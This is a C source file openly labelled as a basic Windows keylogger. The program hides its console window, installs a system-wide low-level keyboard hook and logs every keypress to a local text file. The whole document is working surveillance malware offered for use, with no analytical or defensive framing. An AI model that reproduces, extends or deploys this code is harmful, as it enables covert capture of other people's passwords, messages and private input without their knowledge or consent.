// BASIC Windows C-Keylogger by @Marinos

#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>

#define PATH "./record.txt"

typedef struct _MYHOOKDATA
{
    int nType;
    HOOKPROC hkprc;
    HHOOK hhook;
} MYHOOKDATA;

MYHOOKDATA kb_hook;
UINT map_key;

LRESULT WINAPI LowLevelKeyboardProc(int, WPARAM, LPARAM);
void hide_console(void);

int main()
{
    time_t now = time(NULL);
    MSG msg;
    FILE *file;

    hide_console();

    // Initialize hooks
    kb_hook.nType = WH_KEYBOARD_LL;
    kb_hook.hkprc = LowLevelKeyboardProc;

    // Install hooks
    kb_hook.hhook = SetWindowsHookEx(kb_hook.nType, kb_hook.hkprc, (HINSTANCE)NULL, 0);

    file = fopen(PATH, "a+");
    fprintf(file, "\n\nRecord date: %s\n", ctime(&now));
    fclose(file);

    // Message Loop
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Remove Hook procedure
    if (kb_hook.hhook)
        UnhookWindowsHookEx(kb_hook.hhook);
    return 1;
}

LRESULT WINAPI LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    FILE *file;
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    file = fopen(PATH, "a+");

    if (nCode < 0)
        return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);

    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        // Map virtual key
        map_key = MapVirtualKeyExW(key->vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(LANG_SYSTEM_DEFAULT));

        // Handle special keys
        switch (map_key)
        {
        case VK_RETURN:
            fprintf(file, "[ENTER]");
            return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
        case VK_ESCAPE:
            fprintf(file, " [ESCAPE] ");
            return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
        case VK_SPACE:
            fprintf(file, " [SPACE] ");
            return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
        case 0x51:
            fprintf(file, " [QUIT] ");
            fclose(file);
            PostQuitMessage(0);
        default:
            fprintf(file, " %c ", map_key);
        }
    }

    return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
}

void hide_console()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}